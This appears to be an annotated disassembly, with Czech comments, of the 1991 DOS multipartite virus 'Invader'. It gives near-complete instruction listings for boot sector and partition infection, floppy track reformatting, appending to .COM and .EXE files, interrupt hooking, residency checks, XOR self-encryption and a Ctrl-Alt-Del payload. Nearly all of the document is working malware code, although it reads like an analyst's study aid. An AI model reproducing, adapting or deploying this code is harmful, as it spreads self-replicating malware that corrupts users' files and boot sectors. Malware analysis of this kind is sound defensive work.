;---------------------------------------------------------------------
; virus INVADER                   ziskan 21. 8. 1991 z knihvny (Baran)
; Jedna se o kombinovany virus napadajici  BOOT sektor a  .COM a  .EXE 
; soubory. Inspiraci pro EXE cast viru je JERUSALEM B virus. 
;---------------------------------------------------------------------
AX=0000  BX=0000  CX=1064  DX=0000  SP=FFFE  BP=0000  SI=0000  DI=0000
DS=48C5  ES=48C5  SS=48C5  CS=48C5  IP=0100   NV UP EI PL NZ NA PO NC
-10:0100 E92E0B         JMP    0C31

0000  E9 2E 0B 01 00 F5 54 61-28 99 05 00 00 00 14 17  i....uTa(.......
0010  E0 41 90 19 64 00 C5 48-00 00 03 00 B8 00 50 01  `A..d.EH....8.P.
0020  8F 20 20 20 20 20 20 20-20 20 20 20 20 20 90 19  .             ..
0030  20 20 20 20 20 20 20 20-01 00 34 0E 60 61 00 01          ..4.`a..
0040  20 20 F5 68 50 0D 41 00-00 25 01 00 00 00 00 01    uhP.A..%......
0050  50 41 43 41 44 2E 45 58-45 43 4F 4D 4D 41 4E 44  PACAD.EXECOMMAND
0060  2E 43 4F 4D 2E 43 4F 4D-2E 45 58 45 10 00 00 02  .COM.COM.EXE....
0070  00 00 80 00 30 BD 5C 00-30 BD 6C 00 30 BD 62 79  ....0=\.0=l.0=by
0080  20 49 6E 76 61 64 65 72-2C 20 46 65 6E 67 20 43   Invader, Feng C
0090  68 69 61 20 55 2E 2C 20-57 61 72 6E 69 6E 67 3A  hia U., Warning:
00A0  20 44 6F 6E 27 74 20 72-75 6E 20 41 43 41 44 2E   Don't run ACAD.
00B0  45 58 45 21 D8 0F 8E 0C-90 0A 90 0A 24 00 48 05  EXE!X.......$.H.
00C0  24 00 48 05 24 00 47 06-24 00 47 06 24 00 D8 0F  $.H.$.G.$.G.$.X.
00D0  D8 0F 8E 0C 90 0A 90 0A-24 00 48 05 24 00 48 05  X.......$.H.$.H.
00E0  24 00 ED 05 24 00 ED 05-24 00 C1 10 C1 10 1D 0E  $.m.$.m.$.A.A...
00F0  69 09 69 09 24 00 B4 04-24 00 B4 04 24 00 ED 05  i.i.$.4.$.4.$.m.
;=====================================================================
; Obsluha preruseni  8H
;
02B3    INT   3
        CMP   Byte Ptr CS:[003F],01
        JZ    02DD
        PUSH  AX
        MOV   AX,CS:[003A]
        CMP   CS:[0003],AX
        JA    02CD
        INC   Word Ptr CS:[0003]
02CD    PUSH  CX
        MOV   CX,CS:[0003]
02D3    NOP
        LOOP  02D3
        POP   CX
        POP   AX
02D8    JMP   0DD5:00AB
02DD    INC   Word Ptr CS:[0003]
        CMP   Word Ptr CS:[0003],8000
        JA    02ED
        JMP   02D8
02ED    PUSH  DS
        PUSH  AX
        PUSH  BX
        PUSH  CS
        POP   DS
        CMP   Byte Ptr [0048],01
        JNZ   02FC
        JMP   0332
        NOP
02FC    MOV   BX,[004B]
        DEC   Byte Ptr [004A]
        JNZ   036D
        IN    AL,61
        AND   AL,FE
        OUT   61,AL
        MOV   BX,[004B]
        INC   Word Ptr [004B]
        CMP   BX,0096
        JNZ   031D
        JMP   0352
        NOP
031D    MOV   AL,[BX+01E0]
        MOV   [004A],AL
        SHL   BX,1
        MOV   AX,[BX+00B4]
        CMP   AX,0000
        JZ    0332
        JMP   033B
0332    IN    AL,61
        AND   AL,FE
        OUT   61,AL
        JMP   036D
        NOP
033B    MOV   BX,AX
        MOV   AL,B6
        OUT   43,AL
        MOV   AX,BX
        OUT   42,AL
        MOV   AL,AH
        OUT   42,AL
        IN    AL,61
        OR    AL,03
        OUT   61,AL
        JMP   036D
0352    IN    AL,61
        AND   AL,FE
        OUT   61,AL
        MOV   Word Ptr [004B],0000
        MOV   Byte Ptr [004A],01
        MOV   AX,8000
        AND   AH,[0005]
        MOV   [0003],AX
036D    POP   BX
        POP   AX
        POP   DS
0370    JMP   02D8

;=====================================================================
; Obsluha preruseni  9H
;
0373    CLI
        PUSH  AX
        PUSH  DS
        XOR   AX,AX
        MOV   DS,AX
        MOV   AL,[0417]
        POP   DS           ; rozpoznani CTRL ALT DEL
        AND   AL,0C
        CMP   AL,0C        ; Je CTRL -ALT
        JNZ   03B8
        IN    AL,60
        AND   AL,7F
        CMP   AL,53        ; Je DEL
        JNZ   03B8
        MOV   AX,CS:[0003]
        MOV   AH,[0049]
        MOV   CL,05
        CMP   Byte Ptr CS:[003F],01
        JNZ   03AB
        MOV   CL,04
        Word Ptr CS:[0003],8000
        JB    03AB
        MOV   CL,01
03AB    SHR   AH,CL
        CMP   AL,AH
        JA    03B8
03B1    MOV   AL,20
        OUT   20,AL
        JMP   03BE
03B8    POP   AX
03B9    JMP   0DD5:0125
03BE    PUSH  CS
        .
        . OBSLUHA CTRL ALT DEL + pomocne procedury
        .
;==========================================================
;
;
04C1      DB 0
04C2      DW ?
;
;----------------------------------------------------------
; Cteni s RESETEM a opakovanim.
;
04C4    MOV    Byte Ptr [04C1],00 
        MOV   [04C2],AX
04CC    CALL  04E9
        AND   AH,C3
        JZ    04E8
        MOV   AH,00         ; RESET
        CALL  04E9          ;-------------------------------
        MOV   AX,[04C2]
        INC   Byte Ptr [04C1]
        CMP   Byte Ptr [04C1],01
        JBE   04CC
        STC
04E8    RET

04E9      PUSHF               ; Volani puvodni obsluhy
          CALL  FAR CS:[0634] ; preruseni 13H.
          RET

;=====================================================================
; Obsluha preruseni 13H
;
04F0 80FC02         CMP   AH,02   ; operace cteni ?
04F3 751B           JNZ   0510
04F5 F6C280         TEST  DL,80
04F8 751A           JNZ   0514
04FA 80FA02         CMP   DL,02
04FD 7711           JA    0510
04FF 83F902         CMP   CX,+02  ; pro disketu 2 sektor,
0502 750C           JNZ   0510    ;             0 stopa
0504 80FE00         CMP   DH,00   ;             0 hlava
0507 7507           JNZ   0510
0509 EB13           JMP   051E
050B 90             NOP

050C                DB     01, 00, 80, 01

0510 E92001         JMP    0633    ; KONEC

513                 DB     00

0614 80FE01         CMP    DH,01  ; pro disk    libovolny sektor
0517 75F7           JNZ   0510    ;             1 hlava
0519 80FD00         CMP   CH,00   ;             0 stopa
051C 75F2           JNZ   0510
051E 2E803E130502   CMP   Byte Ptr CS:[0513],02
0524 7407           JZ    052D
0526 2EFE061305     INC   Byte Ptr CS:[0513]
052B EBE3           JMP   0510
052D 2EC606130500   MOV   Byte Ptr CS:[0513],00
0533 2E803E480001   CMP   Byte Ptr CS:[0048],01
0539 74D5           JZ    0510
053B 50             PUSH  AX
053C 53             PUSH  BX
053D 51             PUSH  CX
053E 52             PUSH  DX
053F 56             PUSH  SI
0540 57             PUSH  DI
0541 06             PUSH  ES
0542 1E             PUSH  DS
0543 8CC8           MOV   AX,CS
0545 8ED8           MOV   DS,AX
0547 8EC0           MOV   ES,AX
0549 88164D00       MOV   [004D],DL
054D B400           MOV   AH,00
054F E897FF         CALL  04E9    ; RESET ZARIZENI
0552 BB0010         MOV   BX,1000
0555 B80102         MOV   AX,0201
0558 B90100         MOV   CX,0001
055B B600           MOV   DH,00
055D E889FF         CALL  04E9    ; NACTI BOOT SEKTOR
0560 7243           JB    05A5
0562 F6C280         TEST  DL,80
0565 7405           JZ    056C
0567 E8CE00         CALL  0638    ; PRO PEVNY DISK BOOT SEKTOR
056A 7239           JB    05A5    ; AKTIVNI PARTITION
056C B8CB3C         MOV   AX,3CCB ; Je virus pritomny ?
056F 39473E         CMP   [BX+3E],AX
0572 7518           JNZ   058C
0574 8B4740         MOV   AX,[BX+40]
0577 3DFEFF         CMP   AX,FFFE
057A 7429           JZ    05A5
057C 2B4742         SUB   AX,[BX+42]
057F 3D0400         CMP   AX,0004
0582 7508           JNZ   058C
0584 E8E300         CALL  066A
0587 7303           JNB   058C
0589 E99F00         JMP   062B
058C F6064D0080     TEST  Byte Ptr [004D],80
0591 7415           JZ    05A8
0593 C6064F0007     MOV   Byte Ptr [004F],07  ; kam ulozit virus
0598 C606500000     MOV   Byte Ptr [0050],00  ; u pevneho disku
059D C6064E0000     MOV   Byte Ptr [004E],00
05A2 EB3F           JMP   05E3
05A4 90             NOP
05A5 E98300         JMP   062B
05A8 C6064F0001     MOV   Byte Ptr [004F],01  ; kam ulozit virus
05AD C606500028     MOV   Byte Ptr [0050],28  ; u diskety
05B2 8A4715         MOV   AL,[BX+15]
05B5 3CFC           CMP   AL,FC
05B7 7305           JNB   05BE
05B9 C606500050     MOV   Byte Ptr [0050],50
05BE A05000         MOV   AL,[0050]
05C1 BB8F02         MOV   BX,028F
05C4 B90900         MOV   CX,0009
05C7 8807           MOV   [BX],AL ; U diskety zaroven
05C9 83C304         ADD   BX,+04  ; preformatuj nultou
05CC E2F9           LOOP  05C7    ; stopu.
05CE B80905         MOV   AX,0509
05D1 BB8F02         MOV   BX,028F
05D4 C6064E0000     MOV   Byte Ptr [004E],00
05D9 C6064F0001     MOV   Byte Ptr [004F],01
05DE E8AD00         CALL  068E
05E1 7248           JB    062B

05E3 BB0000         MOV   BX,0000              ; Zapis virus.
05E6 A14F00         MOV   AX,[004F]
05E9 A3440E         MOV   [0E44],AX
05EC A14D00         MOV   AX,[004D]
05EF A3460E         MOV   [0E46],AX
05F2 B80903         MOV   AX,0309
05F5 E89600         CALL  068E                 ;-----------------------
05F8 7231           JB    062B
05FA C6064F0001     MOV   Byte Ptr [004F],01
05FF C606500000     MOV   Byte Ptr [0050],00
0604 F6C280         TEST  DL,80
0607 740C           JZ    0615
0609 A10C05         MOV   AX,[050C]
060C A34F00         MOV   [004F],AX
060F A10E05         MOV   AX,[050E]
0612 A34D00         MOV   [004D],AX
0615 BE0310         MOV   SI,1003
0618 BF030E         MOV   DI,0E03
061B B92500         MOV   CX,0025
061E 90             NOP
061F FC             CLD
0620 F3A4      REPZ MOVSB
0622 BB000E         MOV   BX,0E00 ; Zapis virus do BOOT sektoru.   
0625 B80103         MOV   AX,0301
0628 E86300         CALL  068E
062B 1F             POP   DS
062C 07             POP   ES
062D 5F             POP   DI
062E 5E             POP   SI
062F 5A             POP   DX
0630 59             POP   CX
0631 5B             POP   BX
0632 58             POP   AX
0633 EA88227000     JMP   0070:2288

;------------------------------------------------------------------
; Pro pevny disk nalezeni aktivni PARTITION a nacteni BOOT sektoru.
;
0638    MOV   SI,11BE
        MOV   BL,04
063D    CMP   Byte Ptr [SI],80
        JZ    0650
        CMP   Byte Ptr [SI],00
        JNZ   064E
        ADD   SI,+10
        DEC   BL
        JNZ   063D
064E    STC
        RET
0650    MOV   AX,[SI]
        MOV   [050E],AX
        MOV   AX,[SI+02]
        MOV   [050C],AX
        MOV   DX,[SI]
        MOV   CX,[SI+02]
        MOV   AX,0201
        MOV   BX,1000
        CALL  04C4
        RET

066A 8B4740         MOV   AX,[BX+40]
066D 33D2           XOR   DX,DX
066F F77718         DIV   Word Ptr [BX+18]
0672 FEC2           INC   DL
0674 88164F00       MOV   [004F],DL
0678 33D2           XOR   DX,DX
067A F7771A         DIV   Word Ptr [BX+1A]
067D 88164E00       MOV   [004E],DL
0681 A25000         MOV   [0050],AL
0684 B80102         MOV   AX,0201
0687 BB0010         MOV   BX,1000
068A E80100         CALL  068E
068D C3             RET

068E 8B0E4F00       MOV   CX,[004F]
0692 8B164D00       MOV   DX,[004D]
0696 E82BFE         CALL  04C4
0699 C3             RET

;=====================================================================
; Obsluha preruseni 21H
;
069A 9C             PUSHF
069B 3D4342         CMP   AX,4243   ; test pritommnosti viru
069E 7505           JNZ   06A5
06A0 B87856         MOV   AX,5678
06A3 9D             POPF
06A4 CF             IRET
06A5 3D4442         CMP   AX,4244
06A8 741F           JZ    06C9
06AA 3D004B         CMP   AX,4B00        ; EXEC
06AD 7503           JNZ   06B2
06AF EB2E           JMP   06DF
06B1 90             NOP
06B2 3D003D         CMP   AX,3D00
06B5 750B           JNZ   06C2
06B7 2E803E3E0001   CMP   Byte Ptr [003E],01
06BD 7403           JZ    06C2
06BF EB1E           JMP   06DF
06C2 CC             INT   3
06C3 9D             POPF
06C4 EA14021C10     JMP   101C:0214
06C9 58             POP   AX
06CA 58             POP   AX
06CB 58             POP   AX
06CC 2EA3DD06       MOV   CS:[06DD],AX
06D0 F3A4      REPZ MOVSB
06D2 9D             POPF
06D3 E87703         CALL  0A4D
06D6 8B0E1400       MOV   CX,[0014]
06DA EA0001EE13     JMP   13EE:0100
;====================================================================
; obsluha sluzby EXEC
;
06DF 2EC7060A00FFFF MOV   Word Ptr CS:[000A],FFFF
06E6 2EC70638000000 MOV   Word Ptr CS:[0038],0000
06ED 2E89160600     MOV   CS:[0006],DX
06F2 2E8C1E0800     MOV   CS:[0008],DS
06F7 50             PUSH  AX
06F8 53             PUSH  BX
06F9 51             PUSH  CX
06FA 52             PUSH  DX
06FB 56             PUSH  SI
06FC 57             PUSH  DI
06FD 1E             PUSH  DS
06FE 06             PUSH  ES
06FF FC             CLD
0700 8BF2           MOV   SI,DX
0702 8A04           MOV   AL,[SI]    ; konverze jmena na velka
0704 0AC0           OR    AL,AL      ; pismena.
0706 740E           JZ    0716
0708 3C61           CMP   AL,61                         ;'a'
070A 7207           JB    0713
070C 3C7A           CMP   AL,7A                         ;'z'
070E 7703           JA    0713
0710 802C20         SUB   Byte Ptr [SI],20              ;' '
0713 46             INC   SI
0714 EBEC           JMP   0702
0716 2E89363C00     MOV   CS:[003C],SI   ; ukazatel za jmeno
071B 8BC6           MOV   AX,SI
071D 0E             PUSH  CS
071E 07             POP   ES
071F B90B00         MOV   CX,000B
0722 2BF1           SUB   SI,CX
0724 BF5900         MOV   DI,0059        ; nenapadame COMMAND.COM
0727 F3A6      REPZ CMPSB
0729 7503           JNZ   072E
072B E9EA02         JMP   0A18
072E 8BF0           MOV   SI,AX
0730 B90800         MOV   CX,0008
0733 2BF1           SUB   SI,CX
0735 BF5100         MOV   DI,0051
0738 F3A6      REPZ CMPSB                ; a ACAD.EXE
073A 751F           JNZ   075B
073C E81903         CALL  0A58
073F 2E803E3F0001   CMP   Byte Ptr CS:[003F],01
0745 7409           JZ    0750
0747 2E83063A001E   ADD   Word Ptr CS:[003A],+1E
074D EB08           JMP   0757
074F 90             NOP
0750 2E810603000004 ADD   Word Ptr CS:[0003],0400
0757 F9             STC
0758 EB0D           JMP   0767
075A 90             NOP
075B B80043         MOV   AX,4300   ; atributy souboru
075E CD21           INT   21        ;----------------------
0760 7205           JB    0767
0762 2E890E0C00     MOV   CS:[000C],CX
0767 726F           JB    07D8
0769 32C0           XOR   AL,AL
076B 2EA21B00       MOV   CS:[001B],AL
076F 2E8B363C00     MOV   SI,CS:[003C]
0774 B90400         MOV   CX,0004
0777 2BF1           SUB   SI,CX
0779 BF6400         MOV   DI,0064   ; porovname s .COM
077C F3A6      REPZ CMPSB
077E 741A           JZ    079A
0780 2EFE061B00     INC   Byte Ptr CS:[001B]
0785 2E8B363C00     MOV   SI,CS:[003C]
078A B90400         MOV   CX,0004
078D 2BF1           SUB   SI,CX
078F BF6800         MOV   DI,0068
0792 F3A6      REPZ CMPSB           ; a .EXE
0794 7404           JZ    079A
0796 F9             STC
0797 EB3F           JMP   07D8
0799 90             NOP
079A 8BFA           MOV   DI,DX
079C 32D2           XOR   DL,DL
079E 807D013A       CMP   Byte Ptr [DI+01],3A           ;':'
07A2 7505           JNZ   07A9
07A4 8A15           MOV   DL,[DI]
07A6 80E21F         AND   DL,1F
07A9 B436           MOV   AH,36     ; Zjisti volny prostor
07AB CD21           INT   21        ; na disku.
07AD 3DFFFF         CMP   AX,FFFF   ;
07B0 7503           JNZ   07B5      ;
07B2 E96302         JMP   0A18      ;
07B5 F7E3           MUL   BX        ;
07B7 F7E1           MUL   CX        ;
07B9 0BD2           OR    DX,DX     ;
07BB 7505           JNZ   07C2      ;
07BD 3D0010         CMP   AX,1000   ;
07C0 72F0           JB    07B2      ;----------------------
07C2 2E8B160600     MOV   DX,CS:[0006]
07C7 B8003D         MOV   AX,3D00   ; otevri soubor
07CA 2EC6063E0001   MOV   Byte Ptr CS:[003E],01
07D0 CD21           INT   21
07D2 2EC6063E0000   MOV   Byte Ptr CS:[003E],00
07D8 7267           JB    0841
07DA 2EA30A00       MOV   CS:[000A],AX
07DE 8BD8           MOV   BX,AX
07E0 B80242         MOV   AX,4202   ; SEEK na konec - 5
07E3 B9FFFF         MOV   CX,FFFF
07E6 BAFBFF         MOV   DX,FFFB
07E9 CD21           INT   21
07EB 7254           JB    0841
07ED 050500         ADD    AX,0005
07F0 2EA31400       MOV    CS:[0014],AX
07F4 B80042         MOV    AX,4200
07F7 B90000         MOV    CX,0000  ; SEEK na zacatek + 12
07FA BA1200         MOV    DX,0012
07FD CD21           INT    21
07FF 7240           JB     0841
0801 B90200         MOV    CX,0002
0804 BA3600         MOV    DX,0036
0807 8BFA           MOV    DI,DX
0809 8CC8           MOV    AX,CS
080B 8ED8           MOV    DS,AX
080D 8EC0           MOV    ES,AX
080F B43F           MOV    AH,3F    ; precteme 2 byte
0811 CD21           INT    21
0813 8B05           MOV    AX,[DI]
0815 3D9019         CMP    AX,1990  ; Pokud jsou 1990, koncime.
0818 7507           JNZ    0821
081A B43E           MOV    AH,3E
081C CD21           INT    21
081E E9F701         JMP    0A18
0821 B82435         MOV    AX,3524  ; redefinice preruseni 24H
0824 CD21           INT    21
0826 891E230A       MOV    [0A23],BX
082A 8C06250A       MOV    [0A25],ES
082E BA270A         MOV    DX,0A27
0831 B82425         MOV    AX,2524
0834 CD21           INT    21       ;--------------------------
0836 C5160600       LDS    DX,[0006]
083A 33C9           XOR    CX,CX
083C B80143         MOV    AX,4301  ; nastav atributy
083F CD21           INT    21
0841 723B           JB     087E
0843 2E8B1E0A00     MOV    BX,CS:[000A]
0848 B43E           MOV    AH,3E    ; zavri soubor
084A CD21           INT    21
084C 2EC7060A00FFFF MOV    Word Ptr CS:[000A],FFFF
0853 B8023D         MOV    AX,3D02  ; otevri v R/W modu
0856 CD21           INT    21
0858 7224           JB     087E
085A 2EA30A00       MOV    CS:[000A],AX
085E 8CC8           MOV    AX,CS
0860 8ED8           MOV    DS,AX
0862 8EC0           MOV    ES,AX
0864 8B1E0A00       MOV    BX,[000A]
0868 B80057         MOV    AX,5700  ; datum posledni modifikace
086B CD21           INT    21
086D 89160E00       MOV    [000E],DX
0871 890E1000       MOV    [0010],CX
0875 B80042         MOV    AX,4200  ; seek na zacatek
0878 33C9           XOR    CX,CX
087A 8BD1           MOV    DX,CX
087C CD21           INT    21
087E 7255           JB     08D5
0880 803E1B0000     CMP    Byte Ptr [001B],00
0885 7403           JZ     088A
0887 EB6B           JMP    08F4

;---------------------------------------------------------------
; OBSLUHA .COM souboru.
;
088A BB0010         MOV    BX,1000
088D B448           MOV    AH,48
088F CD21           INT    21
0891 730B           JNB    089E
0893 B43E           MOV    AH,3E
0895 8B1E0A00       MOV    BX,[000A]
0899 CD21           INT    21
089B E97A01         JMP    0A18
089E FF063800       INC    Word Ptr [0038]
08A2 8EC0           MOV    ES,AX
08A4 33F6           XOR    SI,SI
08A6 8BFE           MOV    DI,SI
08A8 A10300         MOV    AX,[0003]
08AB 0C01           OR     AL,01
08AD A20500         MOV    [0005],AL
08B0 C606480001     MOV    Byte Ptr [0048],01
08B5 E87201         CALL   0A2A
08B8 B90010         MOV    CX,1000
08BB F3A4      REPZ MOVSB
08BD E86A01         CALL   0A2A
08C0 C606480000     MOV    Byte Ptr [0048],00
08C5 8BD7           MOV    DX,DI
08C7 8B0E1400       MOV    CX,[0014]
08CB 8B1E0A00       MOV    BX,[000A]
08CF 06             PUSH   ES
08D0 1F             POP    DS
08D1 B43F           MOV    AH,3F
08D3 CD21           INT    21
08D5 7215           JB     08EC
08D7 03F9           ADD    DI,CX
08D9 7211           JB     08EC
08DB 33C9           XOR    CX,CX
08DD 8BD1           MOV    DX,CX
08DF B80042         MOV    AX,4200
08E2 CD21           INT    21
08E4 8BCF           MOV    CX,DI
08E6 33D2           XOR    DX,DX
08E8 B440           MOV    AH,40
08EA CD21           INT    21
08EC 7210           JB     08FE
08EE E86701         CALL   0A58
08F1 E9DF00         JMP    09D3

;---------------------------------------------------------------
; OBSLUHA .EXE souboru.
;
08F4 B91C00         MOV    CX,001C     ; nacteni .EXE headeru
08F7 BA1C00         MOV    DX,001C
08FA B43F           MOV    AH,3F
08FC CD21           INT    21
08FE 7252           JB     0952
0900 813E2E009019   CMP    Word Ptr [002E],1990  ; kontrolni suma
0906 744A           JZ     0952
0908 C7062E009019   MOV    Word Ptr [002E],1990
090E A12A00         MOV    AX,[002A]   ; SS
0911 A34200         MOV    [0042],AX
0914 A12C00         MOV    AX,[002C]   ; SP
0917 A34000         MOV    [0040],AX
091A A13000         MOV    AX,[0030]   ; IP
091D A3A60B         MOV    [0BA6],AX
0920 A13200         MOV    AX,[0032]   ; CS
0923 A3A80B         MOV    [0BA8],AX
0926 A12000         MOV    AX,[0020]   ; pocet bloku
0929 833E1E0000     CMP    Word Ptr [001E],+00
092E 7401           JZ     0931
0930 48             DEC    AX
0931 F7266E00       MUL    Word Ptr [006E]
0935 03061E00       ADD    AX,[001E]   ; byte v poslednim bloku
0939 83D200         ADC    DX,+00
093C 050F00         ADD    AX,000F
093F 83D200         ADC    DX,+00
0942 25F0FF         AND    AX,FFF0
0945 A34400         MOV    [0044],AX
0948 89164600       MOV    [0046],DX
094C 050010         ADD    AX,1000
094F 83D200         ADC    DX,+00
0952 723A           JB     098E
0954 F7366E00       DIV    Word Ptr [006E]
0958 0BD2           OR     DX,DX
095A 7401           JZ     095D
095C 40             INC    AX
095D A32000         MOV    [0020],AX
0960 89161E00       MOV    [001E],DX
0964 A14400         MOV    AX,[0044]
0967 8B164600       MOV    DX,[0046]
096B F7366C00       DIV    Word Ptr [006C]
096F 2B062400       SUB    AX,[0024]
0973 A33200         MOV    [0032],AX
0976 C7063000630B   MOV    Word Ptr [0030],0B63
097C A32A00         MOV    [002A],AX
097F C7062C00FE0D   MOV    Word Ptr [002C],0DFE
0985 33C9           XOR    CX,CX
0987 8BD1           MOV    DX,CX
0989 B80042         MOV    AX,4200
098C CD21           INT    21
098E 720A           JB     099A
0990 B91C00         MOV    CX,001C
0993 BA1C00         MOV    DX,001C
0996 B440           MOV    AH,40
0998 CD21           INT    21
099A 7211           JB     09AD
099C 3BC1           CMP    AX,CX
099E 7533           JNZ    09D3
09A0 8B164400       MOV    DX,[0044]
09A4 8B0E4600       MOV    CX,[0046]
09A8 B80042         MOV    AX,4200
09AB CD21           INT    21
09AD 7224           JB     09D3
09AF A10300         MOV    AX,[0003]
09B2 0C01           OR     AL,01
09B4 A20500         MOV    [0005],AL
09B7 C606480001     MOV    Byte Ptr [0048],01
09BC E86B00         CALL   0A2A
09BF 33D2           XOR    DX,DX
09C1 B90010         MOV    CX,1000
09C4 B440           MOV    AH,40
09C6 CD21           INT    21
09C8 E85F00         CALL   0A2A
09CB C606480000     MOV    Byte Ptr [0048],00
09D0 E88500         CALL   0A58
09D3 2E833E380000   CMP    Word Ptr CS:[0038],+00
09D9 7404           JZ     09DF
09DB B449           MOV    AH,49
09DD CD21           INT    21
09DF 2E833E0A00FF   CMP    Word Ptr CS:[000A],-01
09E5 7431           JZ     0A18
09E7 2E8B1E0A00     MOV    BX,CS:[000A]
09EC 2E8B160E00     MOV    DX,CS:[000E]
09F1 2E8B0E1000     MOV    CX,CS:[0010]
09F6 B80157         MOV    AX,5701
09F9 CD21           INT    21
09FB B43E           MOV    AH,3E
09FD CD21           INT    21
09FF 2EC5160600     LDS    DX,CS:[0006]
0A04 2E8B0E0C00     MOV    CX,CS:[000C]
0A09 B80143         MOV    AX,4301
0A0C CD21           INT    21
0A0E 2EC516230A     LDS    DX,CS:[0A23]
0A13 B82425         MOV    AX,2524
0A16 CD21           INT    21
0A18 07             POP    ES
0A19 1F             POP    DS
0A1A 5F             POP    DI
0A1B 5E             POP    SI
0A1C 5A             POP    DX
0A1D 59             POP    CX
0A1E 5B             POP    BX
0A1F 58             POP    AX
0A20 E99FFC         JMP    06C2

0A23 BF0563         MOV    DI,6305
0A26 16             PUSH   SS

;===============================================================
; Obsluha preruseni 24H
;
0A27 32C0           XOR    AL,AL
0A29 CF             IRET

;=====================================================================
; KODOVACI PROCEDURA kodujeme od 51H o delce 262H.
;
0A2A 1E             PUSH   DS
0A2B 06             PUSH   ES
0A2C 57             PUSH   DI
0A2D 56             PUSH   SI
0A2E 51             PUSH   CX
0A2F 50             PUSH   AX
0A30 0E             PUSH   CS
0A31 07             POP    ES
0A32 0E             PUSH   CS
0A33 1F             POP    DS
0A34 BE5100         MOV    SI,0051
0A37 8BFE           MOV    DI,SI
0A39 B96202         MOV    CX,0262
0A3C 8A260500       MOV    AH,[0005]
0A40 AC             LODSB
0A41 32C4           XOR    AL,AH
0A43 AA             STOSB
0A44 E2FA           LOOP   0A40
0A46 58             POP    AX
0A47 59             POP    CX
0A48 5E             POP    SI
0A49 5F             POP    DI
0A4A 07             POP    ES
0A4B 1F             POP    DS
0A4C C3             RET

0A4D 33C0           XOR    AX,AX
0A4F 8BD8           MOV    BX,AX
0A51 8BD0           MOV    DX,AX
0A53 8BF0           MOV    SI,AX
0A55 8BF8           MOV    DI,AX
0A57 C3             RET

0A58 2EFE064900     INC    Byte Ptr CS:[0049]
0A5D C3             RET

0A5E 1E             PUSH   DS
0A5F 0E             PUSH   CS
0A60 1F             POP    DS
0A61 B400           MOV    AH,00
0A63 CD1A           INT    1A
0A65 8BDA           MOV    BX,DX
0A67 CD1A           INT    1A
0A69 3BDA           CMP    BX,DX
0A6B 74FA           JZ     0A67
0A6D 33F6           XOR    SI,SI
0A6F 8BDA           MOV    BX,DX
0A71 CD1A           INT    1A
0A73 46             INC    SI
0A74 3BDA           CMP    BX,DX
0A76 74F9           JZ     0A71
0A78 8BDE           MOV    BX,SI
0A7A D1E3           SHL    BX,1
0A7C 891E3A00       MOV    [003A],BX
0A80 C6063F0000     MOV    Byte Ptr [003F],00
0A85 C606480000     MOV    Byte Ptr [0048],00
0A8A E440           IN     AL,40
0A8C 8AE0           MOV    AH,AL
0A8E E440           IN     AL,40
0A90 8AC4           MOV    AL,AH
0A92 2E32060500     XOR    AL,CS:[0005]
0A97 3C1F           CMP    AL,1F
0A99 7705           JA     0AA0
0A9B C6063F0001     MOV    Byte Ptr [003F],01
0AA0 C70603000100   MOV    Word Ptr [0003],0001
0AA6 C7064B000000   MOV    Word Ptr [004B],0000
0AAC C6064A0001     MOV    Byte Ptr [004A],01
0AB1 C6063E0000     MOV    Byte Ptr [003E],00
0AB6 C606730F00     MOV    Byte Ptr [0F73],00
0ABB 90             NOP
0ABC 1F             POP    DS
0ABD C3             RET

;=====================================================================
;
;
-10:0BBE 1E             PUSH   DS
-10:0BBF 06             PUSH   ES
-10:0BC0 33C0           XOR    AX,AX
-10:0BC2 8ED8           MOV    DS,AX
-10:0BC4 A11304         MOV    AX,[0413]     ; velikost pammeti v KB
-10:0BC7 B106           MOV    CL,06         ; prepocet na paragrafy
-10:0BC9 D3E0           SHL    AX,CL
-10:0BCB 8ED8           MOV    DS,AX
-10:0BCD 33F6           XOR    SI,SI         ; Na konci pameti hledame
-10:0BCF 8B443E         MOV    AX,[SI+3E]    ; zda je virus pritommny.
-10:0BD2 3DCB3C         CMP    AX,3CCB
-10:0BD5 7434           JZ     0C0B          ;
-10:0BD7 833E400EFE     CMP    Word Ptr [0E40],-02
-10:0BDC 7403           JZ     0BE1
-10:0BDE EB4E           JMP    0C2E
-10:0BE0 90             NOP
-10:0BE1 FA             CLI
-10:0BE2 B3FF           MOV    BL,FF
-10:0BE4 B84342         MOV    AX,4243
-10:0BE7 CD21           INT    21
-10:0BE9 3D7856         CMP    AX,5678
-10:0BEC 741A           JZ     0C08
-10:0BEE C606740F01     MOV    Byte Ptr [0F74],01
-10:0BF3 90             NOP
-10:0BF4 FB             STI
-10:0BF5 B82135         MOV    AX,3521
-10:0BF8 CD21           INT    21
-10:0BFA 891EC506       MOV    [06C5],BX
-10:0BFE 8C06C706       MOV    [06C7],ES
-10:0C02 BA9A06         MOV    DX,069A
-10:0C05 B82125         MOV    AX,2521
-10:0C08 EB24           JMP    0C2E
-10:0C0A 90             NOP
-10:0C0B C7443EFEFF     MOV    Word Ptr [SI+3E],FFFE
-10:0C10 33C0           XOR    AX,AX
-10:0C12 8ED8           MOV    DS,AX
-10:0C14 8EC0           MOV    ES,AX
-10:0C16 BE0402         MOV    SI,0204
-10:0C19 BF2000         MOV    DI,0020
-10:0C1C B90200         MOV    CX,0002
-10:0C1F FA             CLI
-10:0C20 F3 A5     REPZ MOVSW
-10:0C22 FB             STI
-10:0C23 BE0C02         MOV    SI,020C
-10:0C26 BF4C00         MOV    DI,004C
-10:0C29 B90200         MOV    CX,0002
-10:0C2C F3 A5     REPZ MOVSW
-10:0C2E 07             POP    ES
-10:0C2F 1F             POP    DS
-10:0C30 C3             RET

;---------------------------------------------------------------------
; pocatek viru pro COM
;
-10:0C31 E88AFF         CALL   0BBE
-10:0C34 B3FF           MOV    BL,FF
-10:0C36 B84342         MOV    AX,4243
-10:0C39 CD21           INT    21
-10:0C3B 3D7856         CMP    AX,5678
-10:0C3E 7513           JNZ    0C53
-10:0C40 B84442         MOV    AX,4244
-10:0C43 BF0001         MOV    DI,0100
-10:0C46 2E8B8D1400     MOV    CX,CS:[DI+0014]
-10:0C4B BE0010         MOV    SI,1000
-10:0C4E 03F7           ADD    SI,DI
-10:0C50 FC             CLD
-10:0C51 CD21           INT    21
-10:0C53 8CCB           MOV    BX,CS
-10:0C55 83C310         ADD    BX,+10
-10:0C58 8ED3           MOV    SS,BX
-10:0C5A BCEE0D         MOV    SP,0DEE
-10:0C5D 53             PUSH   BX
-10:0C5E BB630B         MOV    BX,0B63
-10:0C61 53             PUSH   BX
-10:0C62 CB             RETF

;---------------------------------------------------------------------
